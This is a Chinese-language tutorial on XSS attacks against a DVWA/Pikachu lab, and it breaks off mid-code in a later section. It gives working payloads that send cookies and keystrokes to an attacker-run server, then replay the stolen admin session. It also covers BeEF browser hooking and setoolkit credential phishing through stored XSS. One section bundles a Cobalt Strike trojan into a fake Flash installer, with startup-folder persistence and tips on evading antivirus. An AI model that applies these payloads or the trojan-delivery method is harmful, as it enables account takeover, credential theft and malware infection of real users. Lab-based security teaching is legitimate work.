# XSS跨站脚本攻击

## 0x01:XSS原理

- 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。

- **恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。**
  - **XSS攻击针对的是用户层面的攻击！**

### **XSS的类型**：

#### **反射型XSS**：

- 反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码。

- 反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户
- 当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，
- 然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。

#### **存储型XSS：**

- 存储型 XSS，持久化，代码是存储在服务器中的数据库里，
  - 如在个人信息或发表文章等地方，可以插入代码，
  - 如果插入的数据没有过滤或过滤不严，
  - 那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。

#### **DOM型XSS：**



- DOM，全称 Document Object Model。

- DOM 型 XSS 
  - 是一种特殊类型的反射型 XSS，
  - 它是基于 DOM 文档对象模型的一种漏洞。
  - 可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。
  - 也就是说，客户端的脚本程序可以通过
- DOM 来动态修改页面内容，
  - 从客户端获取 DOM 中的数据并在本地执行，
  - 而不需要与服务器交互，
  - 它只发生在客户端处理数据阶段。

**危害：存储型XSS>反射型XSS>DOM型XSS**

## 环境搭建

- DVWA（Damn Vulnerable Web App）是一个基于PHP/MySql搭建的Web应用程序，
- 旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，
- 帮助Web开发者更好的理解Web应用安全防范的过程。

### 1.上传 DVWA 到 我们的centos 主机

- 把文件直接拖到 /var/www/html 目录下面

- 然后把文件夹的名字改短一点

  ```
  cd /var/www/html
  unzip DVWA-master.zip #解压缩
  mv DVWA-master DVWA  #把名字改短一些
  ```

  ![image-20211223092456196](https://gitee.com/xxb667/img/raw/master/img/image-20211223092456196.png)

### 2.编辑 DVAW 数据库配置文件

生成新的配置文件 config.inc.php

```
cd DVWA/config #切换目录
cp config.inc.php.dist config.inc.php  ##基于模版配置文件，生成新的配置文件 config.inc.php
vim config.inc.php  #打开新生成的文件
```

修改配置

```
21行
$_DVWA[ 'db_user' ] = 'root'; #需要修改成你的 mysql 的 用户名
$_DVWA[ 'db_password' ] = 'kali'; #需要修改成你的 mysql 的密码

#27 28行 加上谷歌开源免费验证码 reCAPTCHA 的公钥和私钥
$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';
$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';
```

保存

```
esc #结束编辑
:wq #保存设置
```

![image-20211223092759136](https://gitee.com/xxb667/img/raw/master/img/image-20211223092759136.png)

### 3.修改文件权限

```
 chown -R apache:apache /var/www/html
```

### 4.部署DVWA网站

物理机打开网址：

```
http://192.168.81.135/DVWA/setup.php  #把IP地址换成自己的centos的IP地址
```

- 点击 create 即可创建完成


- 等待10秒即可返回登陆页面

![image-20211223093132024](https://gitee.com/xxb667/img/raw/master/img/image-20211223093132024.png)

登陆网站：

账户密码

```
Username：admin
Password：password
```

![image-20211223093252646](https://gitee.com/xxb667/img/raw/master/img/image-20211223093252646.png)

#### 安全级别说明

1. Low（低） - 
   - 此安全级别完全容易受到攻击，*并且根本没有安全措施*。
   - 它的用途是作为Web应用程序漏洞
   - 如何通过不良编码实践表现出来的示例，
   - 并作为教授或学习基本利用技术的平台。
2. Medium（中） - 
   - 此设置主要是为了给用户一个*不良安全实践的例子*，
   - 其中开发人员尝试但未能保护应用程序。
   - 它还对用户提出了改进其利用技术的挑战。
3. High（高） - 
   - 此选项是对中等难度的扩展，
   - 混合了*较难或替代的不良做法*来尝试保护代码。
   - 该漏洞可能不允许相同程度的利用，这在各种（CTF） 竞赛中类似。
4. Impossible（不可能） - 
   - 此级别应*针对所有漏洞安全*。
   - 它用于将易受攻击的源代码与安全源代码进行比较

## XSS  DVWA  Low级别

将安全级别改为Low

![image-20211223094010374](https://gitee.com/xxb667/img/raw/master/img/image-20211223094010374.png)

### 0x02:反射型 XSS

- 这个功能类似一个留言板，
- 输入信息后下面会增加对应的信息

![image-20211223094320423](https://gitee.com/xxb667/img/raw/master/img/image-20211223094320423.png)

#### 获取cookie

我们添加一条 JavaScript 代码获取 cookie

在文本框中输入下列代码

```
#我们添加一条 JavaScript 代码获取 cookie

<script>alert(document.cookie);</script>
```

- **alert()**  函数：弹出警告框

- **document.cookie**  显示cookie信息

![image-20211223094646818](https://gitee.com/xxb667/img/raw/master/img/image-20211223094646818.png)

查看源代码

![image-20211223094832894](https://gitee.com/xxb667/img/raw/master/img/image-20211223094832894.png)

- 根据回显信息判断出，显示的文本内容是 Hello $name。

- 我们输入的信息被存放在$name 变量中。

这里我们弹的是cookie，还可以是其他的内容。

和sql注入有一点相似，就是攻击者可以构造恶意的代码。

```
<script>alert("你被黑了")</script> 
#弹出【你被黑了】
```

![image-20211223095037717](https://gitee.com/xxb667/img/raw/master/img/image-20211223095037717.png)

```
<script>alert(/hack/)</script>   
#弹出hack
```

![image-20211223095113310](https://gitee.com/xxb667/img/raw/master/img/image-20211223095113310.png)

```
<script>alert(1)</script>        
#弹出1，对于数字可以不用引号
```

![image-20211223095158859](https://gitee.com/xxb667/img/raw/master/img/image-20211223095158859.png)

#### 补充

##### 什么是 Cookie？

Cookie 用于存储 web 页面的用户信息。

当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。

Cookie 的作用就是用于解决 "如何记录客户端的用户信息":

- 当用户访问 web 页面时，他的名字可以记录在 cookie 中。
- 在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录。

### 0x03:存储型XSS

#### 存储型 XSS 和反射型 XSS 的区别

- 反射型XSS 只会弹一次 cookie 信息。
- 存储型 XSS 每次访问这个页面都是会弹出 cookie 信息。
- 因为 存储型XSS 代码已经嵌入在了该 Web 站点当中，所以每次访问都会被执行。

#### 获取cookie

```
<script>alert(document.cookie);</script>
```

![image-20211223095950952](https://gitee.com/xxb667/img/raw/master/img/image-20211223095950952.png)

![image-20211223100321799](https://gitee.com/xxb667/img/raw/master/img/image-20211223100321799.png)

![image-20211223100353777](https://gitee.com/xxb667/img/raw/master/img/image-20211223100353777.png)

![image-20211223100458344](https://gitee.com/xxb667/img/raw/master/img/image-20211223100458344.png)

任意输入名字和消息进行查看

![image-20211223100820742](https://gitee.com/xxb667/img/raw/master/img/image-20211223100820742.png)

![image-20211223100620063](https://gitee.com/xxb667/img/raw/master/img/image-20211223100620063.png)

![image-20211223100657069](https://gitee.com/xxb667/img/raw/master/img/image-20211223100657069.png)

#### 查看源码

我们按F12查看源码 ：

![image-20211223101226909](https://gitee.com/xxb667/img/raw/master/img/image-20211223101226909.png)

#### 数据库中查看：

使用dvwa数据库

```
 show databases; 
 use dvwa;  
 show tables;
 select * from guestbook;
```

![image-20211223101510742](https://gitee.com/xxb667/img/raw/master/img/image-20211223101510742.png)

![image-20211223101916199](https://gitee.com/xxb667/img/raw/master/img/image-20211223101916199.png)

- 可以看到我门提交的数据被存放在数据库当中。
- 每次用户访问页面时 Web 程序会从数据库中读取出
- XSS 攻击代码，从而被重复利用。

### 0x04:DOM型XSS

- DOM，全称 Document Object Model。
- DOM 型 XSS
  -  其实是一种特殊类型的反射型 XSS，
  - 它是基于 DOM 文档对象模型的一种漏洞。
- 可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。
  - 也就是说，客户端的脚本程序可以通过
- DOM 来动态修改页面内容，
  - 从客户端获取 DOM 中的数据并在本地执行，
  - 而不需要与服务器交互，
  - 它只发生在客户端处理数据阶段。

基于DVWA   XSS(DOM)

#### 构造XSS代码：

```
<script>alert("xss")</script>
```

完整的代码：

```
http://192.168.81.135/DVWA/vulnerabilities/xss_d/?default=<script>alert("xss")</script>
```

![image-20211223102513895](https://gitee.com/xxb667/img/raw/master/img/image-20211223102513895.png)

选择English之后，网页地址变化

![image-20211223102610769](https://gitee.com/xxb667/img/raw/master/img/image-20211223102610769.png)

- 我们把地址栏的English改为我们的构造XSS代码，
- 然后Enter（回车）后查看结果

```
<script>alert("xss")</script>
```

![image-20211223102922888](https://gitee.com/xxb667/img/raw/master/img/image-20211223102922888.png)

#### 按F12查看源码

可以看到，我们的脚本插入到代码中，修改了网页显示的内容

![image-20211223103213021](https://gitee.com/xxb667/img/raw/master/img/image-20211223103213021.png)

### 0x05:使用Pikachu Xss窃取管理员的cookie

#### 攻击拓扑图：

![image-20211223103330960](https://gitee.com/xxb667/img/raw/master/img/image-20211223103330960.png)

#### 1.环境准备：

- 先登录DVWA  

  -  管理员账户：admin 

  -  密码：password

- 打开pikachu平台
  - 找到我们要利用的模块： 
  -  pikachu----【管理工具】--【XSS后台】

![image-20211223103547982](https://gitee.com/xxb667/img/raw/master/img/image-20211223103547982.png)

登录

![image-20211223103831134](https://gitee.com/xxb667/img/raw/master/img/image-20211223103831134.png)

选中【cookie搜集】

![image-20211223103912927](https://gitee.com/xxb667/img/raw/master/img/image-20211223103912927.png)

![image-20211223104026539](https://gitee.com/xxb667/img/raw/master/img/image-20211223104026539.png)

#### 2.修改代码：

```
cd /var/www/html/pikachu/pkxss/xcookie  #切换到cookie相关的目录
vim cookie.php
```

![image-20211223104317344](https://gitee.com/xxb667/img/raw/master/img/image-20211223104317344.png)

- 把图上黄框那一行里面的网址修改为一个可信的网站：
  - 这里的意思是当用户点击后 
  - 向我们的XSS平台写入cookie后 
  - 再跳转回原来的页面

这里我们跳转到原来的那个页面

```
header("Location:http://192.168.81.135/DVWA/vulnerabilities/xss_r/"); #跳转原来的页面，这里IP改为centos的IP地址
```

##### **注意：**

**如果没有这一步 用户点击我们的链接后会一直停留在我们的黑客服务器的页面上，从而引起用户怀疑**。

#### 3.构造payload:

```
<script>document.location='http://192.168.81.135/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>
#IP地址改为我们centos的IP地址
```

- document.cookie
  - 创建 、读取、及删除 cookie。

-  document.location
  -  用于跳转页面

这上面的代码意思是传递 cookie 参数到pikachuXSS管理平台的cookie.php 文件里面

##### 反射型XSS里面操作

拼接后完整的 URL

```
http://192.168.81.135/DVWA/vulnerabilities/xss_r/?name=<script>document.location='http://192.168.81.135/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>
```

但是通过这样访问，因为 url 中直接有“javascript 脚本”有时候服务器会拒绝，有可能不成功的。所以我们需要对
payload 进行 URL编码

##### 对payload进行URL编码

- 首先打开burpsuite  
- 选中decode 模块  ，
  - 复制`<script></script>` 里面的内容
  - 选择  encoder as --URL 

![image-20211223105557031](https://gitee.com/xxb667/img/raw/master/img/image-20211223105557031.png)



![image-20211223105609663](https://gitee.com/xxb667/img/raw/master/img/image-20211223105609663.png)

编码后的内容 为：（注意这里不要复制我的内容，IP地址和你的不一样）

```
http://192.168.81.135/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%38%31%2e%31%33%35%2f%70%69%6b%61%63%68%75%2f%70%6b%78%73%73%2f%78%63%6f%6f%6b%69%65%2f%63%6f%6f%6b%69%65%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
```

##### 在线短地址转化平台

链接太长我们可以使用在线短网址平台，转化为短网址

在线平台：https://6du.in/

![image-20211223105941904](https://gitee.com/xxb667/img/raw/master/img/image-20211223105941904.png)

![image-20211223110137702](https://gitee.com/xxb667/img/raw/master/img/image-20211223110137702.png)

短地址为：

```
http://t-t.ink/8S1Bk
http://t-t.ink/6h1N8
```

输入这个地址后会自动进行跳转

![image-20211223110747237](https://gitee.com/xxb667/img/raw/master/img/image-20211223110747237.png)

#### 4.开始攻击

直接复制上述网址到浏览器中打开：

刷新pikachu XSS平台查看窃取的cookie

![image-20211223110837669](https://gitee.com/xxb667/img/raw/master/img/image-20211223110837669.png)

### 0x06:使用窃取的cookie 登陆DVWA

#### 1:使用普通用户登陆DVWA

重新打开另外一个新的浏览器：

用普通用户登录 DVWA并开启 `burpsuite` 截断

- DVWA 中内置了一些其他用户，这里我使用
  - 用户名：smithy 
  - 密码：password

![image-20211223111440597](https://gitee.com/xxb667/img/raw/master/img/image-20211223111440597.png)

![image-20211223111524858](https://gitee.com/xxb667/img/raw/master/img/image-20211223111524858.png)

因为我们截取的数据包中含有用户名密码， 这里我们先把第一个包发出去

![image-20211223111929325](https://gitee.com/xxb667/img/raw/master/img/image-20211223111929325.png)

#### 2.替换窃取的cookie

把窃取的cookie替换我们截取的数据包里面的cookie

![image-20211223112104126](https://gitee.com/xxb667/img/raw/master/img/image-20211223112104126.png)



替换后在burpsuite里面 点击`发送`  (英文版是`Forward`)

此时查看浏览器 用户名已经变成了admin，虽然我们没用admin的身份登录，但是这里的身份已经是admin



![image-20211223112216639](https://gitee.com/xxb667/img/raw/master/img/image-20211223112216639.png)



**缺点**：

- 用户必须登陆网站才窃取到cookie

- 用户必须点击我们构造的链接

### 0x07:利用存储型XSS获取用户键盘记录

#### 1.环境准备：

修改pikachu平台后端代码：

```
#打开rk.js
vim /var/www/html/pikachu/pkxss/rkeypress/rk.js

#显示行号
:set nu

```

第54行设置为你自己的IP，**路径**也要设置正确。

**注意：**

*这里的代码一定要设置正确，否则接收不到用户发过来的键盘记录*

![image-20211223112635496](https://gitee.com/xxb667/img/raw/master/img/image-20211223112635496.png)

我们还是用pikachu的平台

#### 2.构造payload：

```
<script src='http://192.168.81.135/pikachu/pkxss/rkeypress/rk.js'></script>
```

我们用DVWA存储型XSS页面攻击

这里有个坑： 我们发现输入的内容长度被限制了，后面的输不进去了，怎么办？

![image-20211223112725319](https://gitee.com/xxb667/img/raw/master/img/image-20211223112725319.png)

按F12打开开发者工具

按顺序点击图上的步骤

![image-20211223113009125](https://gitee.com/xxb667/img/raw/master/img/image-20211223113009125.png)



然后复制我们的payload 到留言板点击`Sign Guestbook`

然后我们在 存储型XSS页面随便点击键盘

![image-20211223113222751](https://gitee.com/xxb667/img/raw/master/img/image-20211223113222751.png)

#### 3.抓取键盘记录

打开我们的键盘记录页面

键盘输入内容

![image-20211223113401790](https://gitee.com/xxb667/img/raw/master/img/image-20211223113401790.png)

进行抓取

![image-20211223113417381](https://gitee.com/xxb667/img/raw/master/img/image-20211223113417381.png)

# XSS 攻击的应用

## 0x01：反射型 XSS 攻击劫持用户浏览器

### 1.构建反射型XSS攻击

我们先构建一个反射型的 XSS 攻击跳转到存在漏洞的页面

```
<script>
	window.onload = function() {
	var link=document.getElementsByTagName("a");
	for(j = 0; j < link.length; j++) {
		link[j].href="http://baidu.com";}
	}
</script>
```

- **`window.onload()`** 
  - 方法用于在网页加载完毕后立刻执行的操作
  - 即当 HTML 文档加载完毕后，立刻执行某个方法。

- `getElementsByTagName()` 
  - 方法可返回带有指定标签名的对象的集合

- 代码分析： 
  - 获取页面中所有的 a 标签
  - 存放到 link 数组中
  - 使用 for 循环将 link 数组中的所有元素替换为恶意网址

- 打开 chrome 浏览器，我们在反射型 XSS 中进行测试效果


#### **注意**

安全等级一定要改为low

![image-20211223131937905](https://gitee.com/xxb667/img/raw/master/img/image-20211223131937905.png)

然后输入我们的payload

点击 **submit**

![image-20211223132320520](https://gitee.com/xxb667/img/raw/master/img/image-20211223132320520.png)

我们看到页面没有什么反应：

但是页面上的每一个链接都是baidu.com，黑产中这个办法常用来刷广告。

![image-20211223132629303](https://gitee.com/xxb667/img/raw/master/img/image-20211223132629303.png)

#### 查看源代码

按F12查看源代码

所有的a标签已经被替换成了 baidu.com

![image-20211223132924598](https://gitee.com/xxb667/img/raw/master/img/image-20211223132924598.png)

## 0x02:使用 beef 劫持用户浏览器

### **1.BeEF**原理：

- **BeEF(全称The Browser Exploitation Framework)**，
  - 是一款针对浏览器的渗透测试工具
  - BeEF是前欧美最流行的Web框架攻击平台
  - kali Linux 集成了Beef 框架
    - 它主要用于实现对XSS漏洞的攻击和利用

- 基本原理
  - BeEF主要是往受害者浏览器（被称为“zombie”-僵尸）的网页中插入一段名为hook.js的JS脚本代码，
  - 如果浏览器访问了有**hook.js**(钩子)的页面，
  - 就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，
  - 接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，
  - 询问是否有新的代码需要执行。

- 原理图：

  ![image-20211223133241154](https://gitee.com/xxb667/img/raw/master/img/image-20211223133241154.png)

### 2.kali 2021 安装beef

```
apt install beef-xss　　#安装beef

cd /usr/share/beef-xss　　#切换到beef目录

vim config.yaml　　#打开配置文件
```

按i进入编辑模式

1. 默认的用户名密码需要修改一 
2. 找到host修改成本机（kali）地址

![image-20211223133558286](https://gitee.com/xxb667/img/raw/master/img/image-20211223133558286.png)

#### 开启beef

```
systemctl start beef-xss.service　　#开启beef，每次使用之前都要开一下

浏览器打开  http://192.168.81.131:3000/ui/authentication　　　#把192.168.81.131替换成本机IP
```

可以在物理机打开 也可以在虚拟机打开

![image-20211223133945542](https://gitee.com/xxb667/img/raw/master/img/image-20211223133945542.png)

### **3.beef用法：**

启动beef

![image-20211223134041259](https://gitee.com/xxb667/img/raw/master/img/image-20211223134041259.png)

用法：

![image-20211223134109299](https://gitee.com/xxb667/img/raw/master/img/image-20211223134109299.png)

构造payload语法

```
<script src="http://<IP>:3000/hook.js"></script> 

#<ip> 改为你自己的IP
```

例如： 

```
<script src="http://192.168.81.131:3000/hook.js"></script> 
```

- 在网页中打开一个新标签页

- 用来加载我们生成的 hook.js 钩子文件

- 如果在目标网站直接嵌入 hook.js 容易被发现

  

```
systemctl start apache2  # 启动apache

cd /var/www/html

vim a.html #修改a.html的配置
```

a.html里面的内容为：

```
<html>
	<head>
		<script src='http://192.168.81.131:3000/hook.js'></script>
	</head>
	<body>
		<h1>Hello world!</h1>
	</body>
</html>
```

![image-20211223134553027](https://gitee.com/xxb667/img/raw/master/img/image-20211223134553027.png)

### 4.构造payload

```
<script>
	window.onload = function() {
	var link=document.getElementsByTagName("a");
	for(j = 0; j < link.length; j++) {
		link[j].href="http://192.168.81.131/a.html";}
	}
</script>
```

完整的链接为:

```
http://192.168.81.135/DVWA/vulnerabilities/xss_r/?name=<script> 	window.onload = function() { 	var link=document.getElementsByTagName("a"); 	for(j = 0; j < link.length; j++) { 		link[j].href="http://192.168.81.131/a.html";} 	} </script>
```

使用 burpsuite 进行 URL 编码

![image-20211223135236898](https://gitee.com/xxb667/img/raw/master/img/image-20211223135236898.png)

编码后的链接为：

```
http://192.168.81.135/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%0a%09%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%09%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%0a%09%66%6f%72%28%6a%20%3d%20%30%3b%20%6a%20%3c%20%6c%69%6e%6b%2e%6c%65%6e%67%74%68%3b%20%6a%2b%2b%29%20%7b%0a%09%09%6c%69%6e%6b%5b%6a%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%38%31%2e%31%33%31%2f%61%2e%68%74%6d%6c%22%3b%7d%0a%09%7d%0a%3c%2f%73%63%72%69%70%74%3e
```

可以用在线短地址转化平台进行转换

平台：https://6du.in/

短地址为：

```
http://t-t.ink/9k148
```

**把上述链接放到一个新标签页面上，短地址也行**  

![image-20211223135647125](https://gitee.com/xxb667/img/raw/master/img/image-20211223135647125.png)

当用户点击上面的链接的时候  页面所有的链接都被替换成了 我们的页面。（*有时候我们需要换一个浏览器进行操作）*

![image-20211223140057759](https://gitee.com/xxb667/img/raw/master/img/image-20211223140057759.png)



![image-20211223140214055](https://gitee.com/xxb667/img/raw/master/img/image-20211223140214055.png)

我们查看beef后台

输入用户名密码

![image-20211223140244548](https://gitee.com/xxb667/img/raw/master/img/image-20211223140244548.png)

我们看到机器已经上线

![image-20211223140325046](https://gitee.com/xxb667/img/raw/master/img/image-20211223140325046.png)

### 5.beef 模块的使用

获取 Cookie

![image-20211223140644111](https://gitee.com/xxb667/img/raw/master/img/image-20211223140644111.png)

cookie结果

![image-20211223140724374](https://gitee.com/xxb667/img/raw/master/img/image-20211223140724374.png)

## 0x03:存储型XSS 钓鱼窃取用户信息

### 1.使用 setoolkit 克隆站点

#### 启动

*Setoolkit*是一个开源的社会工程学工具包

kali命令行中直接输入

```
setoolkit  # 启动
输入y 同意
```

![image-20211223141616042](https://gitee.com/xxb667/img/raw/master/img/image-20211223141616042.png)

```
中文翻译：

从菜单中选择：
1）社会工程攻击
2）渗透测试（快速通道）
3）第三方模块
4）更新社会工程师工具包
5）更新 SET 配置
6）帮助，积分和关于

99）退出社会工程师工具包
```

#### 社会工程攻击

**我们选择1**社会工程攻击

![image-20211223141741928](https://gitee.com/xxb667/img/raw/master/img/image-20211223141741928.png)

进入新界面

![image-20211223142023918](https://gitee.com/xxb667/img/raw/master/img/image-20211223142023918.png)

```
中文翻译

菜单:
1）矛网钓鱼攻击载体
2）网站攻击载体
3）传染媒介发生器
4）创建有效负载和侦听器
5）群发邮件攻击
6）基于 Arduino 的攻击向量
7）无线接入点攻击向量
8）QRcode 生成器攻击向量
9）PowerShell 攻击向量
10）第三方模块

99）返回主菜单。
```

#### 网络攻击载体

**选2**

![image-20211223142150762](https://gitee.com/xxb667/img/raw/master/img/image-20211223142150762.png)

进入新界面

![image-20211223142213202](https://gitee.com/xxb667/img/raw/master/img/image-20211223142213202.png)

#### 凭证收割机攻击方法

**选择3**凭证收割机攻击方法

![image-20211223142439066](https://gitee.com/xxb667/img/raw/master/img/image-20211223142439066.png)

#### 克隆站点

**选择2** 克隆站点

![image-20211223142814715](https://gitee.com/xxb667/img/raw/master/img/image-20211223142814715.png)

设置侦听 IP 地址保持默认回车即可

![image-20211223142521567](https://gitee.com/xxb667/img/raw/master/img/image-20211223142521567.png)

##### 输入克隆地址

输入要克隆的地址：

![image-20211223142845278](https://gitee.com/xxb667/img/raw/master/img/image-20211223142845278.png)

这里我们输入

```
http://192.168.81.135/DVWA/login.php 
#设置目标IP地址
```

也就是DVWA的登陆页面

- 这里输入y    
  - 因为我们前面小节启动了 apache 
  - 所以 80 端口是占用的状态，
  - 所以我们可以在这里输入 y 关闭 apache

![image-20211223142957839](https://gitee.com/xxb667/img/raw/master/img/image-20211223142957839.png)

开始监听

![image-20211223143042771](https://gitee.com/xxb667/img/raw/master/img/image-20211223143042771.png)

#### 访问kali的ip

这时候我们访问 kali的ip

![image-20211223143238260](https://gitee.com/xxb667/img/raw/master/img/image-20211223143238260.png)

我们发现他和我们centos上面的页面是一样的。

输入用户名密码 点击登陆试试：

![image-20211223143317698](https://gitee.com/xxb667/img/raw/master/img/image-20211223143317698.png)

此时页面又跳转回centos页面：

![image-20211223143346294](https://gitee.com/xxb667/img/raw/master/img/image-20211223143346294.png)

**输入账户密码点击第1次没反应，再点击一次就有反应了**

同时 打开kali看一下，用户名密码已经被记录了下来

![image-20211223143454239](https://gitee.com/xxb667/img/raw/master/img/image-20211223143454239.png)

但是这里有个问题 这种办法费事费力，而且只能攻击一个人，还需要诱导用户点击我们的链接。

### 2.结合存储型XSS进行页面跳转

构造payload：

```
<script>window.location="http://192.168.81.131/"</script>
#地址是kali钓鱼页面
```

![image-20211223143849411](https://gitee.com/xxb667/img/raw/master/img/image-20211223143849411.png)

![image-20211223143911286](https://gitee.com/xxb667/img/raw/master/img/image-20211223143911286.png)



点击`sign guestbook`

现在只要用户点击到存储型XSS页面  就会跳转到登陆界面，当然你也可以结合上面的办法，把页面中所有的a标签都替换成我们的恶意链接。

![image-20211223144126547](https://gitee.com/xxb667/img/raw/master/img/image-20211223144126547.png)

用户输入密码后 会记录在后台

#### kali界面进行查看

这次输入的是 111和111

![image-20211223144225926](https://gitee.com/xxb667/img/raw/master/img/image-20211223144225926.png)

## 0x04:使用xss漏洞进行钓鱼

### 1.捆绑木马：

将木马与flash安装程序捆绑一起

木马解压位置:windows的自启动目录

这地方让对方下载后，不要急着让木马启动，电脑都会装杀毒，如果**免杀**不到位，一运行就凉了。

开机启动目录

```
C:\ProgramData\Microsoft\Windows\Start\Menu\Programs\Startup
```

解压我们的Flash.zip

 先用CS 生成木马 做好免杀放到里面。

![image-20211223144440022](https://gitee.com/xxb667/img/raw/master/img/image-20211223144440022.png)

![image-20211223144450433](https://gitee.com/xxb667/img/raw/master/img/image-20211223144450433.png)

![image-20211223144505072](https://gitee.com/xxb667/img/raw/master/img/image-20211223144505072.png)

![image-20211223144516155](https://gitee.com/xxb667/img/raw/master/img/image-20211223144516155.png)

这里选择一个保存位置，你最好改下你的木马名字

![image-20211223144531988](https://gitee.com/xxb667/img/raw/master/img/image-20211223144531988.png)



![image-20211223144541986](https://gitee.com/xxb667/img/raw/master/img/image-20211223144541986.png)



![image-20211223144602693](https://gitee.com/xxb667/img/raw/master/img/image-20211223144602693.png)



![image-20211223144616013](https://gitee.com/xxb667/img/raw/master/img/image-20211223144616013.png)



![image-20211223144624448](https://gitee.com/xxb667/img/raw/master/img/image-20211223144624448.png)



![image-20211223144636688](https://gitee.com/xxb667/img/raw/master/img/image-20211223144636688.png)



![image-20211223144645403](https://gitee.com/xxb667/img/raw/master/img/image-20211223144645403.png)

这里的代码为：

```
C:\ProgramData\Microsoft\Windows\Start\Menu\Programs\Startup\artifact.exe
C:\ProgramData\Microsoft\Windows\Start\Menu\Programs\Startup\flashcenter_pp_ax_install_cn.exe
```

![image-20211223144706401](https://gitee.com/xxb667/img/raw/master/img/image-20211223144706401.png)

这个就是我们压缩后捆绑的flash 木马

![image-20211223144721455](https://gitee.com/xxb667/img/raw/master/img/image-20211223144721455.png)

图标要用逆向工具修改，这里我们就不展示了。

把所有的文件压缩成zip格式的压缩包    上传到我们的kali服务器,即`/var/www/html`目录

### 2.修改钓鱼页面文件：

```
unzip Flash.zip
cd Flash #切换目录
vim flash.js  #弹窗页面
```

把下面的链接改为 你kali服务器的钓鱼页面地址

![image-20211223145116834](https://gitee.com/xxb667/img/raw/master/img/image-20211223145116834.png)

这个是钓鱼页面

```
vim index.html
```

```
43行 <a hre=" ">  target="_self">立即下载</a>
#这里双引号里面写上你压缩后木马的名字，如果你的是flash.exe  就改成flash.exe
```

![image-20211223145201126](https://gitee.com/xxb667/img/raw/master/img/image-20211223145201126.png)

### 3.构建payload

```
<script src="http://192.168.81.131/Flash/flash.js"></script>
```

![image-20211223145237360](https://gitee.com/xxb667/img/raw/master/img/image-20211223145237360.png)

把代码插入到存储型XSS页面，或者结合上面的代码 把所有的a标签替换为我们的网址

![image-20211223145256193](https://gitee.com/xxb667/img/raw/master/img/image-20211223145256193.png)

此时DVWA  有XSS漏洞的页面就弹窗Flash版本过低。

![image-20211223145307981](https://gitee.com/xxb667/img/raw/master/img/image-20211223145307981.png)

点击OK后 就会跳转到我们的kali 服务器 钓鱼页面。

![image-20211223145319205](https://gitee.com/xxb667/img/raw/master/img/image-20211223145319205.png)

如果用户点击下载，我们捆绑的木马就会下载到用户的电脑上

![image-20211223145332615](https://gitee.com/xxb667/img/raw/master/img/image-20211223145332615.png)

只要用户打开下载的软件 我们的CS 这边就会上线。

![image-20211223145344903](https://gitee.com/xxb667/img/raw/master/img/image-20211223145344903.png)

## XSS  DVWA  Medium级别

### **反射型xss**

直接输入payload:

```
<script>alter(1);</script>
```

![image-20211223150007149](https://gitee.com/xxb667/img/raw/master/img/image-20211223150007149.png)

发现我们的一对<script> 没有了

查看源代码：

```

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

源代码只过滤了<script> 我们可以大写绕过

构造payload：

```
<SCRIPT>alert(1)</SCRIPT>
```

![image-20211223160933633](https://gitee.com/xxb667/img/raw/master/img/image-20211223160933633.png)

### 存储型XSS

源代码：

```
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
